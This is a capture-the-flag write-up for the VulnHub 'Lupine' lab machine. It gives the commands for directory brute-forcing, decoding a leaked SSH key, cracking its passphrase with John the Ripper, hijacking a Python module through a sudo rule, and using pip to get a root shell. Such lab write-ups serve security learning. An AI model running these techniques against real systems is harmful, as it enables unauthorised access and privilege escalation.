# Lupine: 1 CTF â€“ Summary Walkthrough

A full text-based breakdown of the Lupine vulnerable machine from VulnHub. This box showcases real-world issues like leaked SSH keys, Python module hijacking, and dangerous sudo permissions â€” all leading to privilege escalation.

## Discovery
- Ran `nmap -A -Pn <ip>` â†’ Found ports:
  - 22 (SSH)
  - 80 (HTTP â€“ Apache)

## Enumeration
- Ran `gobuster` on port 80:
  ```
  gobuster dir -u http://<ip> -w /usr/share/wordlists/dirb/common.txt
  ```
- Found `/robots.txt` â†’ Revealed `/~myfiles/`
- Created a custom tilde wordlist:
  ```
  sed 's/^/~/g' /usr/share/wordlists/dirb/common.txt > tilde-list.txt
  ```
- Discovered `/~secret` â†’ Contained:
  - Username: `icex64`
  - Hint: SSH key is hidden
  - Wordlist: Fasttrack

- Used dot-prefixed wordlist to find hidden files:
  ```
  cp /usr/share/wordlists/dirb/directory-list-2.3-small.txt dot-list.txt
  sed -i 's/^/./' dot-list.txt
  gobuster dir -u http://<ip>/~secret -w dot-list.txt
  ```
âœ… Found: `/.mysecret.txt` â†’ Contained encrypted Base58 string

- Decoded in CyberChef â†’ Revealed **private SSH key**

## Foothold
- Saved decoded key to `ssh_key.rsa` â†’ Set permissions:
  ```
  chmod 600 ssh_key.rsa
  ```
- Converted key and cracked with John the Ripper:
  ```
  ssh2john ssh_key.rsa > hash
  john --wordlist=/usr/share/wordlists/fasttrack.txt hash
  ```
- Logged into machine:
  ```
  ssh -i ssh_key.rsa icex64@<ip>
  ```

âœ… Access as user `icex64` via SSH

## User Escalation (icex64 â†’ arsene)
- Checked sudo privileges:
  ```
  sudo -l
  ```
  Output:
  ```
  (arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py
  ```
- `heist.py` imports: `webbrowser.py`

- Found `/usr/lib/python3.9/webbrowser.py`
- Injected shell payload:
  ```python
  import os
  os.system("/bin/bash")
  ```
- Ran the script:
  ```
  sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
  ```

âœ… Switched to user `arsene`

## Privilege Escalation (arsene â†’ root)
- Checked sudo again:
  ```
  sudo -l
  ```
  Output:
  ```
  (ALL : ALL) NOPASSWD: /usr/bin/pip
  ```
- Used GTFOBins pip exploit:
  ```
  TF=$(mktemp -d)
  sudo pip install --target=$TF ptyprocess
  sudo PYTHONPATH=$TF python3 -c 'import ptyprocess; ptyprocess.spawn("/bin/bash")'
  ```

âœ… Gained root shell

---

**Full walkthrough with screenshots:**  
ðŸ‘‰ [View the Medium post here](https://medium.com/@basitolasubomibalogun/lupine-vulnhub-ctf-walkthrough-ssh-key-leak-python-hijack-root-via-pip-gtfobins-dde7f2ec149c)
